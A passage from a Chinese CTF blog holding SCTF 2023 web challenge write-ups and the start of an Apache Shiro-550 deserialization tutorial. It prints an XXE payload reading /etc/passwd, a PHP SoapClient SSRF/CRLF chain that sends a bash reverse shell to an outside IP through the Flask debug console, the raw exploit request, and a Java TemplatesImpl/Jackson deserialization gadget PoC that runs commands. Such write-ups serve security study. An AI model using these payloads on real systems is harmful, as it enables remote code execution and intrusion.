src="../images/image-20230621212254271.png" alt="image-20230621212254271"></p><p>刚好找到了这个类   可以使用xxe来读取文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$class</span> = <span class="string">&#x27;SimpleXMLElement&#x27;</span>;</span><br><span class="line"><span class="variable">$evilxml</span> = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY file SYSTEM  &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;xxe&gt;&amp;file;&lt;/xxe&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;properties&#x27;</span> =&gt; <span class="keyword">array</span>(<span class="variable">$evilxml</span>, <span class="string">&#x27;2&#x27;</span>),<span class="string">&#x27;type&#x27;</span>=&gt;<span class="variable">$class</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621222930826.png" alt="image-20230621222930826"></p><p>然后去读题目给的/app/app.py</p><p><img src="../images/image-20230621223042971.png" alt="image-20230621223042971"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>开了debug只有两条路   <strong>热覆盖 和 算pin</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$properties</span>) &amp;&amp; <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>)))&#123;</span><br><span class="line">    <span class="variable">$object</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>));</span><br><span class="line">    <span class="variable">$object</span>-&gt;<span class="title function_ invoke__">sctf</span>();</span><br><span class="line">    <span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>这里注意一下   这里会调用<code>call</code>()方法  </p><p>覆盖暂时没找到原生类的call方法可以覆盖写文件的，而有个原生类的call是经常用：<code>SoapClient</code></p><p>可以用他的ssrf和crlf打组合拳，这样我们就可以把cookie塞</p><p><code>SoapClient</code>在ctfshow的web259有详细使用   <a href="https://ke1nys.github.io/posts/fd5983bb.html#web259">web259</a></p><p>接下来我们去看一下<code>console</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$object</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;http://127.0.0.1:5000/&#x27;</span> . <span class="variable">$properties</span>);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621233844882.png" alt="image-20230621233844882"></p><p>猜测是算pin</p><p>那么我们就可以用上面的<code>xxe</code>来读取算<code>pin</code>所需要的东西</p><p><img src="../images/image-20230621234154080.png" alt="image-20230621234154080"></p><p>所以这些得一个一个来获取</p><ul><li>machine_id  —&gt;  349b3354-f67f-4438-b395-4fbc01171fdd</li><li>uuidnode   ——&gt;   02:42:ac:13:00:02      (2485378023426)</li><li>moddir  <strong>flask库下app.py的绝对路径  但是这道题没给触发页面报错来获取信息  所以我们得使用别的原生类来模糊查找</strong></li></ul><p>(其实不用也行  可以猜一下  找到例题来看看他的<code>moddir</code>   然后修改一下python版本一下一下试就行了)</p><p><code>/usr/lib/python3.8/site-packages/flask/app.py</code>   这是moddir</p><p>有了这些东西之后  我们就可以直接算pin了</p><p>算出来的pin    <code>121-260-582</code></p><p>由于算pin来rce需要cookie的header   所以用常规的只会输出pin码   并不会输出cookie 所以得找一个脚本能两个同时生成的</p><p><img src="../images/image-20230622000408987.png" alt="image-20230622000408987"></p><p>然后去通过<code>soapclient</code>去访问debug界面，由于<code>debugmode</code>的rce需要携带cookie，因此只有<code>soapclient</code>可以做到   (<strong>其实就是ssrf加crlf</strong>)</p><p><strong>(简单点说就是伪造http头)</strong>     不明白的可以去看上面写的  <strong>web259的链接</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1:5000/console?&amp;__debugger__=yes&amp;cmd=__import__(%22os%22).popen(%22bash%20-c%20%5C%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F101.42.39.110%2F3389%20%3C%261%5C%22%22)&amp;frm=0&amp;s=DhOJxtvMXCtezvKtqaK9&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: __wzdb2a60e2b19822632a67c=1687363437|11b8517fb9fb&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;wupco\r\n&quot;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$headers</span>),<span class="string">&#x27;uri&#x27;</span>=&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line"><span class="variable">$arr</span>=<span class="title function_ invoke__">Array</span>(<span class="string">&quot;properties&quot;</span>=&gt;<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>)),<span class="string">&quot;type&quot;</span>=&gt;<span class="string">&quot;SimpleXMLElement&quot;</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$aaa</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">115.239</span><span class="number">.215</span><span class="number">.75</span>:<span class="number">8081</span></span><br><span class="line">Content-Length: <span class="number">922</span></span><br><span class="line">Cache-Control: <span class="built_in">max</span>-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Origin: null</span><br><span class="line">Content-<span class="type">Type</span>: multipart/form-data; boundary=----WebKitFormBoundaryt1mG5nxqspditAqy</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">114.0</span><span class="number">.0</span><span class="number">.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line">Cookie: PHPSESSID=1nys</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryt1mG5nxqspditAqy</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="line"></span><br><span class="line">tyaoo</span><br><span class="line">------WebKitFormBoundaryt1mG5nxqspditAqy</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;data&quot;</span></span><br><span class="line"></span><br><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;properties&quot;</span>;s:<span class="number">643</span>:<span class="string">&quot;O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22aaab%22%3Bs%3A8%3A%22location%22%3Bs%3A205%3A%22http%3A%2F%2F127.0.0.1%3A5000%2Fconsole%3F%26__debugger__%3Dyes%26cmd%3D__import__%28%2522os%2522%29.popen%28%2522bash%2520-c%2520%255C%2522bash%2520-i%2520%253E%2526%2520%252Fdev%252Ftcp%252F101.42.39.110%252F3389%2520%253C%25261%255C%2522%2522%29%26frm%3D0%26s%3DDhOJxtvMXCtezvKtqaK9%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A92%3A%22wupco%0D%0AX-Forwarded-For%3A+127.0.0.1%0D%0ACookie%3A+__wzdb2a60e2b19822632a67c%3D1687363437%7C11b8517fb9fb%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;type&quot;</span>;s:<span class="number">16</span>:<span class="string">&quot;SimpleXMLElement&quot;</span>;&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230622004425446.png" alt="image-20230622004425446"></p><p><strong>这吊题真难</strong></p><h2 id="hellojava"><a href="#hellojava" class="headerlink" title="hellojava"></a>hellojava</h2><p>题目就给了一个jar包   进行反编译查看</p><p><img src="../images/image-20230622195938811.png" alt="image-20230622195938811"></p><p><strong>这时jar包里的内容    还给了一个  <code>1.jar</code>   里面含有这个javassist  说明可以使用<code>templatesimpl</code></strong></p><p><img src="../images/image-20230622200111030.png" alt="image-20230622200111030"></p><p><strong>看了一下<code>pom.xml</code></strong></p><p>发现一共给了三种依赖</p><ul><li>scala    2.13.7</li><li>jackson</li><li>hessian     4.0.4</li></ul><p>一般来说就先对这个<code>pom.xml</code>的依赖进行分析  发现<code>scala</code>这个版本是存在漏洞的</p><p><img src="../images/image-20230622202022788.png" alt="image-20230622202022788"></p><p><img src="../images/image-20230622202525933.png" alt="image-20230622202525933"></p><p>找到了反序列化入口   那么关键点就是如何进入这个if判断了</p><p><img src="../images/image-20230622204854853.png" alt="image-20230622204854853"></p><p><img src="../images/image-20230622204904698.png" alt="image-20230622204904698"></p><p>这个东西要为true才行  但是如果简单的这样传值的话</p><p><code>&#123;&quot;IfInput&quot;:true,&quot;base64Code&quot;:&quot;AAAAAAAA&quot;&#125;</code>  这样简单的传值的话是不行的</p><p><img src="../images/image-20230622205042591.png" alt="image-20230622205042591"></p><p>关键词搜索  <a href="http://blog.kuron3k0.vip/2021/04/10/vulns-of-misunderstanding-annotation/">Jackson注解的一个trick</a>   发现了这篇文章就是讲这个的</p><p><strong>使用空值就可以进行绕过了</strong></p><p><code>&#123;&quot;&quot;:true,&quot;base64Code&quot;:&quot;AAAAAAAA&quot;&#125;</code></p><p>接下来就到如何进行反序列化利用了</p><p><img src="../images/image-20230622205655871.png" alt="image-20230622205655871"></p><p>结合这个<code>LazyList</code>东西和刚开始分析的<code>scala</code>漏洞的内容   可以猜测用这个反序列化来清空黑名单过滤</p><p><a href="https://github.com/yarocher/lazylist-cve-poc">https://github.com/yarocher/lazylist-cve-poc</a>   用这个代码  然后直接打就行了</p><p><code>mvn -q exec:java -Dexec.mainClass=&quot;poc.cve.lazylist.payload.Main&quot; -Dexec.args=&quot;./security/blacklist.txt false&quot;</code> 生成 Base64 payload</p><p><img src="../images/image-20230622213852125.png" alt="image-20230622213852125"></p><p>发包来打  将 <code>security/blacklist.txt</code> 清空</p><p>之后再使用 jackson 利用链，可以裸反序列化 RCE </p><p><img src="../images/image-20230622213955923.png" alt="image-20230622213955923"></p><p>最终<strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="comment">//import com.fasterxml.jackson.databind.node.POJONode;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = getTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytecodes);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">11</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line"></span><br><span class="line">        System.out.println(serial(exp));</span><br><span class="line">        deserial(serial(exp));</span><br><span class="line">        <span class="comment">//serial(exp);</span></span><br><span class="line">        <span class="comment">//serialize(exp);</span></span><br><span class="line">        <span class="comment">//unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    public static void doPOST(byte[] obj) throws Exception&#123;</span></span><br><span class="line"><span class="comment">//        HttpHeaders requestHeaders = new HttpHeaders();</span></span><br><span class="line"><span class="comment">//        requestHeaders.set(&quot;Content-Type&quot;, &quot;text/plain&quot;);</span></span><br><span class="line"><span class="comment">//        URI url = new URI(&quot;http://112.124.14.13:8080/bypassit&quot;);</span></span><br><span class="line"><span class="comment">//        HttpEntity&lt;byte[]&gt; requestEntity = new HttpEntity &lt;&gt; (obj,requestHeaders);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        RestTemplate restTemplate = new RestTemplate();</span></span><br><span class="line"><span class="comment">//        ResponseEntity&lt;String&gt; res = restTemplate.postForEntity(url, requestEntity, String.class);</span></span><br><span class="line"><span class="comment">//        System.out.println(res.getBody());</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplatesImpl(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Base64Encode</span><span class="params">(ByteArrayOutputStream bs)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(encode);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println(s.length());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object arg)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, arg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>(<strong>不知道为啥  这里我只能用这种形式的poc才能弹计算器    如果用<code>xx.class</code>这种形式的poc的话  是弹不出计算器的。。。。。。。</strong>)</p><p>这里注意的一点就是  新建项目的时候</p><p><img src="../images/image-20230624210123241.png" alt="image-20230624210123241"><em>**</em></p><p>得把<code>BaseJsonNode</code>里的这个东西给注释掉</p><p><strong>不然会报错</strong></p><p>这其实不是预期解  </p><p><img src="../images/image-20230624210304228.png" alt="image-20230624210304228"></p><p>预期解是打这个<code>hessian</code>这条链子</p><p><strong>官方wp是这样说的</strong></p><p><img src="../images/image-20230624210928869.png" alt="image-20230624210928869"></p><h2 id="an4er-monitor"><a href="#an4er-monitor" class="headerlink" title="an4er_monitor"></a>an4er_monitor</h2><p><strong>描述</strong></p><p><img src="../images/image-20230624212738790.png" alt="image-20230624212738790"></p><p>没环境   看官方wp有个思路就行了  </p>]]></content>
      
      
      
        <tags>
            
            <tag> sctf-web-2023 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java-shiro</title>
      <link href="/posts/55797267.html"/>
      <url>/posts/55797267.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://juejin.cn/post/7133959651653058574">参考文章1</a>     <a href="https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.999.0.0&amp;vd_source=bacfffe46b930fda5761b63367eb298c">参考视频 </a>  <a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">参考文章2</a></p><p>(<strong>主要看参考文章2</strong>)</p><h2 id="Shiro简介"><a href="#Shiro简介" class="headerlink" title="Shiro简介"></a>Shiro简介</h2><p><a href="https://link.juejin.cn/?target=https%3A%2F%2Fso.csdn.net%2Fso%2Fsearch%3Fq%3DApache%26spm%3D1001.2101.3001.7020">Apache</a> Shiro 是一个强大易用的Java安全框架,提供了认证、授权、加密和会话管理等功能，Shiro框架直观、易用、同时也能提供健壮的安全性。</p><p>Apache Shiro<a href="https://link.juejin.cn/?target=https%3A%2F%2Fso.csdn.net%2Fso%2Fsearch%3Fq%3D%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%26spm%3D1001.2101.3001.7020">反序列化</a>漏洞分为两种：<strong>Shiro-550</strong>、<strong>Shiro-721</strong></p><h2 id="Shiro-550反序列化漏洞"><a href="#Shiro-550反序列化漏洞" class="headerlink" title="Shiro-550反序列化漏洞"></a>Shiro-550反序列化漏洞</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。 那么，Payload产生的过程： 命令=&gt;序列化=&gt;AES加密=&gt;base64编码=&gt;RememberMe Cookie值 在整个漏洞利用过程中，比较重要的是AES加密的密钥，如果没有修改默认的密钥那么就很容易就知道密钥了,Payload构造起来也是十分的简单。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Apache Shiro &lt; 1.2.4</p><h3 id="Shiro反序列化的特征"><a href="#Shiro反序列化的特征" class="headerlink" title="Shiro反序列化的特征"></a>Shiro反序列化的特征</h3><p>返回包中会包含rememberMe=deleteMe字段</p><p>这种情况大多会发生在登录处，返回包里包含remeberMe=deleteMe字段，这个是在返回包中(Response)</p><p>如果返回的数据包中没有remeberMe=deleteMe字段的话，可以在数据包中的Cookie中添加remeberMe=deleteMe字段这样也会在返回包中有这个字段</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>这里用的P神给的环境 ：<a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">https://github.com/phith0n/JavaThings/tree/master/shirodemo</a></p><ul><li>JDK 8u65</li><li>Tomcat 9</li><li>Shiro 1.2.4</li><li>Commons Collection 3.2.1</li></ul><p>先把p神的项目下载下来</p><p><img src="../images/image-20230619172524775.png" alt="image-20230619172524775"></p><p>然后用<code>idea</code>打开<code>shirodemo</code></p><p><img src="../images/image-20230619172551611.png" alt="image-20230619172551611"></p><p>接着就是配置<code>tomacat</code>了</p><p><img src="../images/image-20230619172643791.png" alt="image-20230619172643791"></p><p>先去官网把他下载下来</p><p>然后进入idea打开设置</p><p><img src="../images/image-20230619172728851.png" alt="image-20230619172728851"></p><p><img src="../images/image-20230619172749282.png" alt="image-20230619172749282"></p><p>添加tomacat的路径</p><p><img src="../images/image-20230619172816282.png" alt="image-20230619172816282"></p><p>接着点击这个</p><p><img src="../images/image-20230619172838144.png" alt="image-20230619172838144"></p><p>先配置这个</p><p><img src="../images/image-20230619172854359.png" alt="image-20230619172854359"></p><p>最后就完成了</p><p><img src="../images/image-20230619172911210.png" alt="image-20230619172911210"></p><h3 id="漏洞的利用"><a href="#漏洞的利用" class="headerlink" 